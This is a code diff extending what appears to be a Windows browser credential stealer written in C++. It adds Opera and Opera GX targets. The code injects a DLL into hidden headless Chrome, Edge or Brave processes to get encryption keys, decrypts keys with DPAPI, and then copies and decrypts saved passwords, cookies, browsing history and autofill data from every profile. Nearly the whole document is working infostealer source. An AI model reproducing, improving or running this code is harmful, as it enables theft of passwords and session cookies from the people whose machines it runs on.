@@ -16,6 +16,7 @@
 #include <shlwapi.h>
 #include <wincrypt.h>
 #include <bcrypt.h>
+#include <cstdlib>
 #include "bootstrapper.h"
 #include "json.hpp"
 #include "sqlite3.h"
@@ -23,7 +24,7 @@
 using json = nlohmann::json;
 namespace fs = std::filesystem;
 
-enum class Browser { Chrome, Edge, Brave };
+enum class Browser { Chrome, Edge, Brave, Opera, OperaGX };
 
 struct PasswordData { std::string url, username, password; };
 struct CookieData {
@@ -221,6 +222,30 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
     return false;
 }
 
+bool copy_db_with_sidecars(const fs::path& source_db, const fs::path& dest_db) {
+    if (!copy_file_locked(source_db, dest_db)) return false;
+    copy_file_locked(source_db.string() + "-wal", dest_db.string() + "-wal");
+    copy_file_locked(source_db.string() + "-shm", dest_db.string() + "-shm");
+    copy_file_locked(source_db.string() + "-journal", dest_db.string() + "-journal");
+    return true;
+}
+
+int open_db_for_extraction(const std::string& path, sqlite3** db) {
+    int rc = sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_NOMUTEX, nullptr);
+    if (rc == SQLITE_OK) {
+        sqlite3_exec(*db, "PRAGMA wal_checkpoint(TRUNCATE);", nullptr, nullptr, nullptr);
+    }
+    return rc;
+}
+
+void cleanup_db_temp(const fs::path& db_path) {
+    std::error_code ec;
+    fs::remove(db_path, ec);
+    fs::remove(db_path.string() + "-wal", ec);
+    fs::remove(db_path.string() + "-shm", ec);
+    fs::remove(db_path.string() + "-journal", ec);
+}
+
 int open_db_readonly(const std::string& path, sqlite3** db) {
     std::string uri = "file:" + path + "?mode=ro&nolock=1";
     return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
@@ -230,12 +255,17 @@ struct BrowserConfig {
     std::wstring name;
     std::wstring exe_name;
     std::vector<std::wstring> common_paths;
+    bool use_injection;
+    std::wstring data_path_relative;
+    int csidl_folder;
 };
 
 const std::vector<BrowserConfig> BROWSERS = {
-    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}},
-    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}},
-    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}}
+    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, true, L"Google\\Chrome\\User Data", CSIDL_LOCAL_APPDATA},
+    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, true, L"Microsoft\\Edge\\User Data", CSIDL_LOCAL_APPDATA},
+    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, true, L"BraveSoftware\\Brave-Browser\\User Data", CSIDL_LOCAL_APPDATA},
+    {L"Opera", L"launcher.exe", {L"C:\\Program Files\\Opera\\launcher.exe"}, false, L"Opera Software\\Opera Stable", CSIDL_APPDATA},
+    {L"Opera GX", L"launcher.exe", {L"C:\\Program Files\\Opera GX\\launcher.exe"}, false, L"Opera Software\\Opera GX Stable", CSIDL_APPDATA}
 };
 
 std::wstring find_browser_exe(const std::wstring& name) {
@@ -247,6 +277,20 @@ std::wstring find_browser_exe(const std::wstring& name) {
         if (b_name_lower == target_name_lower) {
             for (const auto& path : b.common_paths) {
                 if (fs::exists(path)) return path;
+            }
+
+            // Search in Local AppData Programs (common for User-only installs)
+            wchar_t local_app[MAX_PATH];
+            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app) == S_OK) {
+                fs::path base = fs::path(local_app) / L"Programs";
+                fs::path target;
+                if (b.name == L"Chrome") target = base / L"Google/Chrome/Application/chrome.exe";
+                else if (b.name == L"Edge") target = base / L"Microsoft/Edge/Application/msedge.exe";
+                else if (b.name == L"Brave") target = base / L"BraveSoftware/Brave-Browser/Application/brave.exe";
+                else if (b.name == L"Opera") target = base / L"Opera/launcher.exe";
+                else if (b.name == L"Opera GX") target = base / L"Opera GX/launcher.exe";
+
+                if (!target.empty() && fs::exists(target)) return target.wstring();
             }
         }
     }
@@ -344,79 +388,84 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
 void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
     std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;
 
-    DWORD existing_pid = find_main_process(browser.exe_name);
     HANDLE h_process = NULL;
     bool process_started_by_us = false;
     PROCESS_INFORMATION pi = { 0 };
 
-    if (existing_pid != 0) {
-        std::wcout << L"Found existing " << browser.name << L" process (PID: " << existing_pid << L"). Injecting..." << std::endl;
-        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
-    }
+    if (browser.use_injection) {
+        DWORD existing_pid = find_main_process(browser.exe_name);
+        if (existing_pid != 0) {
+            std::wcout << L"Found existing " << browser.name << L" process (PID: " << existing_pid << L"). Injecting..." << std::endl;
+            h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
+        }
 
-    if (!h_process) {
-        std::wcout << L"Starting new " << browser.name << L" process..." << std::endl;
-        std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
-        std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
-        cmd_buf.push_back(0);
+        if (!h_process) {
+            std::wcout << L"Starting new " << browser.name << L" process..." << std::endl;
+            std::wstring cmd = browser.exe_name + L" --headless=new --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
+            std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
+            cmd_buf.push_back(0);
 
-        STARTUPINFOW si = { sizeof(si) };
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
+            STARTUPINFOW si = { sizeof(si) };
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
 
-        BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-        if (!success) {
-            std::wstring path = find_browser_exe(browser.name);
-            if (!path.empty()) {
-                std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
-                std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
-                full_cmd_buf.push_back(0);
-                success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+            BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+            if (!success) {
+                std::wstring path = find_browser_exe(browser.name);
+                if (!path.empty()) {
+                    std::wstring full_cmd = L"\"" + path + L"\" --headless=new --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
+                    std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
+                    full_cmd_buf.push_back(0);
+                    success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+                }
+            }
+
+            if (success) {
+                h_process = pi.hProcess;
+                process_started_by_us = true;
+            } else {
+                std::wcerr << L"Failed to create or open " << browser.exe_name << L" process" << std::endl;
+                return;
             }
         }
+    }
 
-        if (success) {
-            h_process = pi.hProcess;
-            process_started_by_us = true;
-        } else {
-            std::wcerr << L"Failed to create or open " << browser.exe_name << L" process" << std::endl;
-            return;
+    HANDLE h_pipe = INVALID_HANDLE_VALUE;
+    if (browser.use_injection) {
+        h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
+        if (h_pipe == INVALID_HANDLE_VALUE) {
+            std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
+        }
+        inject_dll_reflective(h_process, dll_bytes);
+        if (process_started_by_us) {
+            ResumeThread(pi.hThread);
+            Sleep(500);
         }
     }
-
-    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
-    if (h_pipe == INVALID_HANDLE_VALUE) {
-        std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
-    }
-
-    inject_dll_reflective(h_process, dll_bytes);
-    if (process_started_by_us) ResumeThread(pi.hThread);
 
     std::vector<unsigned char> v10_key, v20_key;
 
     // --- Extraction Logic Start ---
-    char* user_profile_env = getenv("USERPROFILE");
-    if (user_profile_env) {
-        fs::path user_profile(user_profile_env);
-        fs::path data_path;
-        if (browser.name == L"Chrome") data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
-        else if (browser.name == L"Edge") data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+    wchar_t sz_path[MAX_PATH];
+    if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) == S_OK) {
+        fs::path data_path = fs::path(sz_path) / browser.data_path_relative;
 
-        std::string ls_str;
-        std::ifstream ls_file(data_path / "Local State");
-        if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
-
-        json ls_json = json::parse(ls_str, nullptr, false);
-        if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
-            std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
-            auto decoded = base64_decode(key_b64);
-            if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
-                v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
+        {
+            std::ifstream ls_file(data_path / "Local State");
+            if (ls_file) {
+                std::string ls_str((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+                json ls_json = json::parse(ls_str, nullptr, false);
+                if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
+                    std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
+                    auto decoded = base64_decode(key_b64);
+                    if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
+                        v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
+                    }
+                }
             }
         }
 
-        if (h_pipe != INVALID_HANDLE_VALUE) {
+        if (browser.use_injection && h_pipe != INVALID_HANDLE_VALUE) {
             std::cout << "Waiting for DLL to send v20 master key..." << std::endl;
             if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
                 unsigned char key_buf[1024];
@@ -430,27 +479,51 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
             h_pipe = INVALID_HANDLE_VALUE;
         }
 
-        std::vector<std::string> profiles = { "Default" };
-        for (const auto& entry : fs::directory_iterator(data_path)) {
-            if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
+        std::vector<std::string> profiles;
+        if (fs::exists(data_path / "Login Data") || fs::exists(data_path / "Cookies") || fs::exists(data_path / "Web Data")) {
+            profiles.push_back(".");
+        }
+        if (fs::exists(data_path / "Default")) {
+            profiles.push_back("Default");
+        }
+        if (fs::exists(data_path)) {
+            for (const auto& entry : fs::directory_iterator(data_path)) {
+                if (entry.is_directory()) {
+                    std::string name = entry.path().filename().string();
+                    if (name.find("Profile ") == 0) profiles.push_back(name);
+                }
+            }
+        }
+        // Opera GX Side Profiles
+        if (fs::exists(data_path / "Side Profiles")) {
+            for (const auto& entry : fs::directory_iterator(data_path / "Side Profiles")) {
+                if (entry.is_directory()) {
+                    profiles.push_back("Side Profiles/" + entry.path().filename().string());
+                }
+            }
         }
 
-        fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
+        wchar_t temp_base[MAX_PATH];
+        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
+        fs::path temp_dir = fs::path(temp_base) / "Temp" / ("browser_db_" + std::to_string(GetTickCount()));
         fs::create_directories(temp_dir);
-
-        json collected = json::array();
 
         for (auto& profile : profiles) {
             fs::path p_path = data_path / profile;
             ProfileData p_data;
             p_data.name = profile;
 
+            std::string p_name_sanit = profile;
+            std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_');
+            std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_');
+            std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
+
             // Passwords
             fs::path db_path = p_path / "Login Data";
-            fs::path tmp_db = temp_dir / (profile + "_pass.tmp");
-            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
+            fs::path tmp_db = temp_dir / (p_name_sanit + "_pass.tmp");
+            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
                     if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -460,7 +533,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             int pass_len = sqlite3_column_bytes(stmt, 2);
                             if (pass_blob && pass_len > 0) {
                                 std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
-                                auto dec = decrypt_blob(enc_pass, v10_key, v20_key);
+                                std::vector<unsigned char> dec = decrypt_blob(enc_pass, v10_key, v20_key);
                                 if (!dec.empty()) {
                                     p_data.passwords.push_back({ t_url ? t_url : "", t_user ? t_user : "", to_utf8_lossy(dec) });
                                 }
@@ -470,16 +543,16 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // Cookies
             db_path = p_path / "Network/Cookies";
             if (!fs::exists(db_path)) db_path = p_path / "Cookies";
-            tmp_db = temp_dir / (profile + "_cook.tmp");
-            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
+            tmp_db = temp_dir / (p_name_sanit + "_cook.tmp");
+            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
                     if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value, value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -497,7 +570,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             std::string final_value;
                             if (enc_blob && enc_len > 0) {
                                 std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
-                                auto dec = decrypt_blob(enc_val, v10_key, v20_key);
+                                std::vector<unsigned char> dec = decrypt_blob(enc_val, v10_key, v20_key);
                                 if (!dec.empty()) {
                                     final_value = to_utf8_lossy(dec);
                                 }
@@ -515,15 +588,15 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // History
             db_path = p_path / "History";
-            tmp_db = temp_dir / (profile + "_hist.tmp");
-            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
+            tmp_db = temp_dir / (p_name_sanit + "_hist.tmp");
+            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
                     if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -535,15 +608,15 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // Autofill
             db_path = p_path / "Web Data";
-            tmp_db = temp_dir / (profile + "_web.tmp");
-            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
+            tmp_db = temp_dir / (p_name_sanit + "_web.tmp");
+            if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
                 sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
                     if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -555,17 +628,13 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                     }
                     sqlite3_close(db);
                 }
-                fs::remove(tmp_db);
+                cleanup_db_temp(tmp_db);
             }
 
             // Save reports
             fs::path browser_dir(browser.name);
             fs::create_directories(browser_dir);
-            std::string p_name_sanitized = profile;
-            std::replace(p_name_sanitized.begin(), p_name_sanitized.end(), '/', '_');
-            std::replace(p_name_sanitized.begin(), p_name_sanitized.end(), '\\', '_');
-            std::replace(p_name_sanitized.begin(), p_name_sanitized.end(), ':', '_');
-            fs::path profile_dir = browser_dir / p_name_sanitized;
+            fs::path profile_dir = browser_dir / p_name_sanit;
             fs::create_directories(profile_dir);
 
             try {
@@ -669,7 +738,13 @@ int main(int argc, char* argv[]) {
     for (const auto& config : BROWSERS) {
         std::string name_lower(config.name.begin(), config.name.end());
         std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(), ::tolower);
-        if (browser_choice == "all" || browser_choice == name_lower) {
+        name_lower.erase(std::remove(name_lower.begin(), name_lower.end(), ' '), name_lower.end());
+
+        std::string choice_lower = browser_choice;
+        std::transform(choice_lower.begin(), choice_lower.end(), choice_lower.begin(), ::tolower);
+        choice_lower.erase(std::remove(choice_lower.begin(), choice_lower.end(), ' '), choice_lower.end());
+
+        if (choice_lower == "all" || choice_lower == name_lower) {
             inject_and_collect(dll_bytes, config);
         }
     }
